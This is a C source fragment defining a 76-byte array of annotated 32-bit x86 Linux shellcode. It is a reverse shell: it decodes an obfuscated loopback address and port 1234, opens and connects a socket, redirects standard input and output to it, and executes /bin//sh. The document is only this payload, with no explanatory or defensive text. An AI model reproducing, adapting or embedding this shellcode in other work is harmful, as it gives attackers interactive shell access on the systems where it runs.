
#define RS_SIZE 76

char RS[] = {
  /* 0000 */ "\xb8\x80\xff\xff\xfe" /* mov eax, 0xfeffff80 */
  /* 0005 */ "\xba\xfd\xff\xfb\x2d" /* mov edx, 0x2dfbfffd */
  /* 000A */ "\xf7\xd0"             /* not eax             */
  /* 000C */ "\xf7\xd2"             /* not edx             */
  /* 000E */ "\x50"                 /* push eax            */
  /* 000F */ "\x52"                 /* push edx            */
  /* 0010 */ "\x89\xe5"             /* mov ebp, esp        */
  /* 0012 */ "\x31\xdb"             /* xor ebx, ebx        */
  /* 0014 */ "\xf7\xe3"             /* mul ebx             */
  /* 0016 */ "\xb0\x66"             /* mov al, 0x66        */
  /* 0018 */ "\x43"                 /* inc ebx             */
  /* 0019 */ "\x52"                 /* push edx            */
  /* 001A */ "\x53"                 /* push ebx            */
  /* 001B */ "\x6a\x02"             /* push 0x2            */
  /* 001D */ "\x89\xe1"             /* mov ecx, esp        */
  /* 001F */ "\xcd\x80"             /* int 0x80            */
  /* 0021 */ "\x93"                 /* xchg ebx, eax       */
  /* 0022 */ "\x59"                 /* pop ecx             */
  /* 0023 */ "\xb0\x3f"             /* mov al, 0x3f        */
  /* 0025 */ "\xcd\x80"             /* int 0x80            */
  /* 0027 */ "\x49"                 /* dec ecx             */
  /* 0028 */ "\x79\xf9"             /* jns 0x23            */
  /* 002A */ "\x89\xe9"             /* mov ecx, ebp        */
  /* 002C */ "\xb0\x66"             /* mov al, 0x66        */
  /* 002E */ "\x6a\x10"             /* push 0x10           */
  /* 0030 */ "\x51"                 /* push ecx            */
  /* 0031 */ "\x53"                 /* push ebx            */
  /* 0032 */ "\x89\xe1"             /* mov ecx, esp        */
  /* 0034 */ "\x6a\x03"             /* push 0x3            */
  /* 0036 */ "\x5b"                 /* pop ebx             */
  /* 0037 */ "\xcd\x80"             /* int 0x80            */
  /* 0039 */ "\xb0\x0b"             /* mov al, 0xb         */
  /* 003B */ "\x52"                 /* push edx            */
  /* 003C */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f     */
  /* 0041 */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f     */
  /* 0046 */ "\x89\xe3"             /* mov ebx, esp        */
  /* 0048 */ "\x31\xc9"             /* xor ecx, ecx        */
  /* 004A */ "\xcd\x80"             /* int 0x80            */
};